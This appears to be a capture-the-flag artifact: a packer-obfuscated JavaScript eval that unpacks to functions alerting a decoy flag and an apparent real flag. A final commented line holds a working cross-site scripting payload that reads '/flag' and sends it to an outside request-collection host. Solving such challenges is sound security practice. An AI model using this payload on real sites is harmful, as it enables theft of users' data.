eval(function(p, a, c, k, e, d) {
    e = function(c) { return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36)) };
    if (!''.replace(/^/, String)) {
        while (c--) { d[e(c)] = k[c] || e(c) }
        k = [function(e) { return d[e] }];
        e = function() { return '\\w+' };
        c = 1
    };
    while (c--) { if (k[c]) { p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]) } }
    return p
}('G(z(p,a,c,k,e,d){e=z(c){A c.B(L)};E(!\'\'.D(/^/,I)){C(c--){d[c.B(a)]=k[c]||c.B(a)}k=[z(e){A d[e]}];e=z(){A\'\\\\w+\'};c=1};C(c--){E(k[c]){p=p.D(J K(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}A p}(\'l(9(p,a,c,k,e,d){e=9(c){f c};j(!\\\'\\\'.i(/^/,q)){h(c--){d[c]=k[c]||c}k=[9(e){f d[e]}];e=9(){f\\\'\\\\\\\\w+\\\'};c=1};h(c--){j(k[c]){p=p.i(n m(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}f p}(\\\'1 7(){0("6{5}")}1 4(){0("3{2!}")}\\\',8,8,\\\'r|9|s|t|u|v|x|y\\\'.o(\\\'|\\\'),0,{}))\',F,F,\'|||||||||z||||||A||C|D|E||G|K|J|H||I|M|S|O|P|Q||R|N\'.H(\'|\'),0,{}))', 55, 55, '|||||||||||||||||||||||||||||||||||function|return|toString|while|replace|if|35|eval|split|String|new|RegExp|36|alert|notSusFunction|ictf|motSusfunclion|n0t_7h3_f1ag|jctf|y0u_f0und_7h3_f1ag'.split('|'), 0, {}))


// var x=new XMLHttpRequest();x.open('GET','/flag');x.onload=function(){navigator.sendBeacon('http://cw30ckx6.requestrepo.com', this.responseText);};x.send();